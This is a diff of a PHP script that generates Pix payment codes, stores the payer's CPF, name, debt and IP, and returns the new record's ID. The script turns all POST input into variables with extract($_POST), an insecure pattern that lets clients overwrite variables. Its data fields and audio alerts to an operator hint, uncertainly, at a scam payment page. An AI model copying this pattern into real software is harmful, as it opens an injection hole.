@@ -100,7 +100,7 @@ extract($_POST);
         return substr($texto, 0, $max);
     }
 
-     function Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $ref=false, $chavePix) {
+     function Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $chavePix, $ref=false) {
         
         global $pdo;
 
@@ -127,6 +127,8 @@ extract($_POST);
             ':ch' => $chavePix
         ]);
 
+        $lastId = $pdo->lastInsertId();
+
         $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual, hora = :hora WHERE id = :id");
         $updateStmt->execute([
             ':audio' => 3,
@@ -134,6 +136,8 @@ extract($_POST);
             ':hora' => $horaInsert,
             ':id' => 1
         ]);
+
+        return $lastId;
     }
 
     if($valor){ 
@@ -200,11 +204,9 @@ extract($_POST);
 
                                     $ref = $pixCopiarEcoleData->id;
 
-                                    echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole, 'id'=>$ref));
-                                
-                                    setcookie('pixCopiarEcole'.$ResultadoPGX.$out, $pixCopiarEcole, time() + (60 * 20));
-
-                                    Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $ref, $client_secret);
+                                    $lastId = Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $client_secret, $ref);
+                                    
+                                    echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole, 'id'=>$lastId));
 
                                 }else{
                                     echo json_encode(array('status'=>false, 'pix'=>false, 'resposta'=>$pix));
@@ -242,14 +244,14 @@ extract($_POST);
 
                    // $pixCopiarEcole = json_decode($pix)->brcode;
 
-                   $pixCopiarEcole = gerarPix($chavePix, limparTexto($nomePix, 20), limparTexto($cidadePix, 20), $valor);
+                    $pixCopiarEcole = gerarPix($chavePix, limparTexto($nomePix, 20), limparTexto($cidadePix, 20), $valor);
 
                     if($pixCopiarEcole){
                     
-                        echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole));
-                    
-                        Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, false, $chavePix);
+                        $lastId = Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $chavePix, false);
                        
+                        echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole, 'id'=>$lastId));
+                    
                     }else{
 
                         echo json_encode(array('status'=>false, 'pix'=>false));
